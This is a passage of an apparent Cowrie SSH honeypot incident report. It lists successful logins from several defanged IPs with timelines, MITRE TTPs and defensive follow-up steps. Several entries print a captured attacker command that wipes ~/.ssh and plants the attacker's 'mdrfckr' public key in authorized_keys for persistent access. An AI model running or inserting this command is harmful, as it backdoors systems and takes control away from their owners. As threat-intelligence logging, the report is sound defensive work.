| **Last Seen** | 2026-03-18 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 10:56:05` | `cowrie.session.connect` |
| `2026-03-18 10:56:05` | `cowrie.client.version` |
| `2026-03-18 10:56:05` | `cowrie.client.kex` |
| `2026-03-18 10:56:06` | `cowrie.login.success` |
| `2026-03-18 10:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0602f840822b

| Field | Detail |
|---|---|
| **Source IP** | `177.92.51[.]57` |
| **First Seen** | 2026-03-18 11:00 |
| **Last Seen** | 2026-03-18 11:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:00:55` | `cowrie.session.connect` |
| `2026-03-18 11:00:55` | `cowrie.client.version` |
| `2026-03-18 11:00:55` | `cowrie.client.kex` |
| `2026-03-18 11:00:57` | `cowrie.login.success` |
| `2026-03-18 11:00:57` | `cowrie.session.params` |
| `2026-03-18 11:00:57` | `cowrie.command.input` |
| `2026-03-18 11:00:57` | `cowrie.command.failed` |
| `2026-03-18 11:00:58` | `cowrie.log.closed` |
| `2026-03-18 11:00:59` | `cowrie.session.params` |
| `2026-03-18 11:00:59` | `cowrie.command.input` |
| `2026-03-18 11:00:59` | `cowrie.session.file_download` |
| `2026-03-18 11:00:59` | `cowrie.log.closed` |
| `2026-03-18 11:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.92.51[.]57` to AbuseIPDB if not already reported
- [ ] Block `177.92.51[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f65656671e7

| Field | Detail |
|---|---|
| **Source IP** | `177.92.51[.]57` |
| **First Seen** | 2026-03-18 11:01 |
| **Last Seen** | 2026-03-18 11:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:01:03` | `cowrie.session.connect` |
| `2026-03-18 11:01:03` | `cowrie.client.version` |
| `2026-03-18 11:01:03` | `cowrie.client.kex` |
| `2026-03-18 11:01:04` | `cowrie.login.success` |
| `2026-03-18 11:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.92.51[.]57` to AbuseIPDB if not already reported
- [ ] Block `177.92.51[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc8e09e9f140

| Field | Detail |
|---|---|
| **Source IP** | `177.92.51[.]57` |
| **First Seen** | 2026-03-18 11:16 |
| **Last Seen** | 2026-03-18 11:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:16:31` | `cowrie.session.connect` |
| `2026-03-18 11:16:31` | `cowrie.client.version` |
| `2026-03-18 11:16:32` | `cowrie.client.kex` |
| `2026-03-18 11:16:33` | `cowrie.login.success` |
| `2026-03-18 11:16:34` | `cowrie.session.params` |
| `2026-03-18 11:16:34` | `cowrie.command.input` |
| `2026-03-18 11:16:34` | `cowrie.command.failed` |
| `2026-03-18 11:16:34` | `cowrie.log.closed` |
| `2026-03-18 11:16:35` | `cowrie.session.params` |
| `2026-03-18 11:16:35` | `cowrie.command.input` |
| `2026-03-18 11:16:35` | `cowrie.session.file_download` |
| `2026-03-18 11:16:35` | `cowrie.log.closed` |
| `2026-03-18 11:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.92.51[.]57` to AbuseIPDB if not already reported
- [ ] Block `177.92.51[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa6e646b592

| Field | Detail |
|---|---|
| **Source IP** | `177.92.51[.]57` |
| **First Seen** | 2026-03-18 11:16 |
| **Last Seen** | 2026-03-18 11:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:16:39` | `cowrie.session.connect` |
| `2026-03-18 11:16:39` | `cowrie.client.version` |
| `2026-03-18 11:16:39` | `cowrie.client.kex` |
| `2026-03-18 11:16:41` | `cowrie.login.success` |
| `2026-03-18 11:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.92.51[.]57` to AbuseIPDB if not already reported
- [ ] Block `177.92.51[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187f23583b42

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-03-18 11:18 |
| **Last Seen** | 2026-03-18 11:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:18:47` | `cowrie.session.connect` |
| `2026-03-18 11:18:47` | `cowrie.client.version` |
| `2026-03-18 11:18:47` | `cowrie.client.kex` |
| `2026-03-18 11:18:47` | `cowrie.login.success` |
| `2026-03-18 11:18:48` | `cowrie.session.params` |
| `2026-03-18 11:18:48` | `cowrie.command.input` |
| `2026-03-18 11:18:48` | `cowrie.command.failed` |
| `2026-03-18 11:18:48` | `cowrie.log.closed` |
| `2026-03-18 11:18:48` | `cowrie.session.params` |
| `2026-03-18 11:18:48` | `cowrie.command.input` |
| `2026-03-18 11:18:48` | `cowrie.session.file_download` |
| `2026-03-18 11:18:48` | `cowrie.log.closed` |
| `2026-03-18 11:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7880eaa88e

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-03-18 11:18 |
| **Last Seen** | 2026-03-18 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:18:50` | `cowrie.session.connect` |
| `2026-03-18 11:18:50` | `cowrie.client.version` |
| `2026-03-18 11:18:51` | `cowrie.client.kex` |
| `2026-03-18 11:18:52` | `cowrie.login.success` |
| `2026-03-18 11:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a4b50cf56d

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:34 |
| **Last Seen** | 2026-03-18 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:34:18` | `cowrie.session.connect` |
| `2026-03-18 11:34:18` | `cowrie.client.version` |
| `2026-03-18 11:34:18` | `cowrie.client.kex` |
| `2026-03-18 11:34:19` | `cowrie.login.success` |
| `2026-03-18 11:34:19` | `cowrie.session.params` |
| `2026-03-18 11:34:19` | `cowrie.command.input` |
| `2026-03-18 11:34:20` | `cowrie.log.closed` |
| `2026-03-18 11:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1fce08955d

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:34 |
| **Last Seen** | 2026-03-18 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:34:32` | `cowrie.session.connect` |
| `2026-03-18 11:34:32` | `cowrie.client.version` |
| `2026-03-18 11:34:32` | `cowrie.client.kex` |
| `2026-03-18 11:34:33` | `cowrie.login.success` |
| `2026-03-18 11:34:33` | `cowrie.session.params` |
| `2026-03-18 11:34:33` | `cowrie.command.input` |
| `2026-03-18 11:34:34` | `cowrie.log.closed` |
| `2026-03-18 11:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e9df63a625

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:34 |
| **Last Seen** | 2026-03-18 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:34:46` | `cowrie.session.connect` |
| `2026-03-18 11:34:46` | `cowrie.client.version` |
| `2026-03-18 11:34:46` | `cowrie.client.kex` |
| `2026-03-18 11:34:47` | `cowrie.login.success` |
| `2026-03-18 11:34:47` | `cowrie.session.params` |
| `2026-03-18 11:34:47` | `cowrie.command.input` |
| `2026-03-18 11:34:47` | `cowrie.log.closed` |
| `2026-03-18 11:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9abfda8fd39

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:34 |
| **Last Seen** | 2026-03-18 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:34:52` | `cowrie.session.connect` |
| `2026-03-18 11:34:52` | `cowrie.client.version` |
| `2026-03-18 11:34:52` | `cowrie.client.kex` |
| `2026-03-18 11:34:53` | `cowrie.login.success` |
| `2026-03-18 11:34:53` | `cowrie.session.params` |
| `2026-03-18 11:34:53` | `cowrie.command.input` |
| `2026-03-18 11:34:54` | `cowrie.log.closed` |
| `2026-03-18 11:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe2877b4a59a

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:35 |
| **Last Seen** | 2026-03-18 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:35:05` | `cowrie.session.connect` |
| `2026-03-18 11:35:05` | `cowrie.client.version` |
| `2026-03-18 11:35:06` | `cowrie.client.kex` |
| `2026-03-18 11:35:06` | `cowrie.login.success` |
| `2026-03-18 11:35:07` | `cowrie.session.params` |
| `2026-03-18 11:35:07` | `cowrie.command.input` |
| `2026-03-18 11:35:07` | `cowrie.log.closed` |
| `2026-03-18 11:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c903aeadb30

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:35 |
| **Last Seen** | 2026-03-18 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:35:38` | `cowrie.session.connect` |
| `2026-03-18 11:35:38` | `cowrie.client.version` |
| `2026-03-18 11:35:38` | `cowrie.client.kex` |
| `2026-03-18 11:35:39` | `cowrie.login.success` |
| `2026-03-18 11:35:40` | `cowrie.session.params` |
| `2026-03-18 11:35:40` | `cowrie.command.input` |
| `2026-03-18 11:35:40` | `cowrie.log.closed` |
| `2026-03-18 11:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331df06bf301

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:36 |
| **Last Seen** | 2026-03-18 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:36:11` | `cowrie.session.connect` |
| `2026-03-18 11:36:11` | `cowrie.client.version` |
| `2026-03-18 11:36:11` | `cowrie.client.kex` |
| `2026-03-18 11:36:12` | `cowrie.login.success` |
| `2026-03-18 11:36:12` | `cowrie.session.params` |
| `2026-03-18 11:36:12` | `cowrie.command.input` |
| `2026-03-18 11:36:12` | `cowrie.log.closed` |
| `2026-03-18 11:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9cdfa3f156d

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:36 |
| **Last Seen** | 2026-03-18 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:36:31` | `cowrie.session.connect` |
| `2026-03-18 11:36:31` | `cowrie.client.version` |
| `2026-03-18 11:36:31` | `cowrie.client.kex` |
| `2026-03-18 11:36:32` | `cowrie.login.success` |
| `2026-03-18 11:36:32` | `cowrie.session.params` |
| `2026-03-18 11:36:32` | `cowrie.command.input` |
| `2026-03-18 11:36:32` | `cowrie.log.closed` |
| `2026-03-18 11:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88161c39153

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:36 |
| **Last Seen** | 2026-03-18 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:36:37` | `cowrie.session.connect` |
| `2026-03-18 11:36:37` | `cowrie.client.version` |
| `2026-03-18 11:36:37` | `cowrie.client.kex` |
| `2026-03-18 11:36:38` | `cowrie.login.success` |
| `2026-03-18 11:36:38` | `cowrie.session.params` |
| `2026-03-18 11:36:38` | `cowrie.command.input` |
| `2026-03-18 11:36:39` | `cowrie.log.closed` |
| `2026-03-18 11:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228c762da2ff

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:36 |
| **Last Seen** | 2026-03-18 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:36:50` | `cowrie.session.connect` |
| `2026-03-18 11:36:50` | `cowrie.client.version` |
| `2026-03-18 11:36:51` | `cowrie.client.kex` |
| `2026-03-18 11:36:51` | `cowrie.login.success` |
| `2026-03-18 11:36:52` | `cowrie.session.params` |
| `2026-03-18 11:36:52` | `cowrie.command.input` |
| `2026-03-18 11:36:52` | `cowrie.log.closed` |
| `2026-03-18 11:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bbac4b7c15

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:37 |
| **Last Seen** | 2026-03-18 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:37:30` | `cowrie.session.connect` |
| `2026-03-18 11:37:30` | `cowrie.client.version` |
| `2026-03-18 11:37:31` | `cowrie.client.kex` |
| `2026-03-18 11:37:31` | `cowrie.login.success` |
| `2026-03-18 11:37:32` | `cowrie.session.params` |
| `2026-03-18 11:37:32` | `cowrie.command.input` |
| `2026-03-18 11:37:32` | `cowrie.log.closed` |
| `2026-03-18 11:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b81968729f7

| Field | Detail |
|---|---|
| **Source IP** | `157.245.94[.]161` |
| **First Seen** | 2026-03-18 11:37 |
| **Last Seen** | 2026-03-18 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:37:56` | `cowrie.session.connect` |
| `2026-03-18 11:37:56` | `cowrie.client.version` |
| `2026-03-18 11:37:57` | `cowrie.client.kex` |
| `2026-03-18 11:37:58` | `cowrie.login.success` |
| `2026-03-18 11:37:58` | `cowrie.session.params` |
| `2026-03-18 11:37:58` | `cowrie.command.input` |
| `2026-03-18 11:37:58` | `cowrie.log.closed` |
| `2026-03-18 11:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.94[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.94[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a560df5e395d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.175[.]142` |
| **First Seen** | 2026-03-18 11:46 |
| **Last Seen** | 2026-03-18 11:51 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 11:46:10` | `cowrie.session.connect` |
| `2026-03-18 11:46:10` | `cowrie.client.version` |
| `2026-03-18 11:46:12` | `cowrie.client.kex` |
| `2026-03-18 11:46:12` | `cowrie.login.success` |
| `2026-03-18 11:51:12` | `cowrie.session.file_upload` |
| `2026-03-18 11:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.175[.]142` to AbuseIPDB if not already reported
- [ ] Block `180.76.175[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855cd82b286b

| Field | Detail |
|---|---|
| **Source IP** | `43.100.77[.]140` |
| **First Seen** | 2026-03-18 12:23 |
| **Last Seen** | 2026-03-18 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 12:23:09` | `cowrie.session.connect` |
| `2026-03-18 12:23:09` | `cowrie.client.version` |
| `2026-03-18 12:23:09` | `cowrie.client.kex` |
| `2026-03-18 12:23:09` | `cowrie.login.success` |
| `2026-03-18 12:23:09` | `cowrie.session.params` |
| `2026-03-18 12:23:09` | `cowrie.command.input` |
| `2026-03-18 12:23:09` | `cowrie.command.failed` |
| `2026-03-18 12:23:09` | `cowrie.log.closed` |
| `2026-03-18 12:23:10` | `cowrie.session.params` |
| `2026-03-18 12:23:10` | `cowrie.command.input` |
| `2026-03-18 12:23:10` | `cowrie.session.file_download` |
| `2026-03-18 12:23:10` | `cowrie.log.closed` |
| `2026-03-18 12:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.77[.]140` to AbuseIPDB if not already reported
- [ ] Block `43.100.77[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731f524fd425

| Field | Detail |
|---|---|
| **Source IP** | `43.100.77[.]140` |
| **First Seen** | 2026-03-18 12:23 |
| **Last Seen** | 2026-03-18 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 12:23:12` | `cowrie.session.connect` |
| `2026-03-18 12:23:12` | `cowrie.client.version` |
| `2026-03-18 12:23:12` | `cowrie.client.kex` |
| `2026-03-18 12:23:12` | `cowrie.login.success` |
| `2026-03-18 12:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.77[.]140` to AbuseIPDB if not already reported
- [ ] Block `43.100.77[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fbe9dfa25b

| Field | Detail |
|---|---|
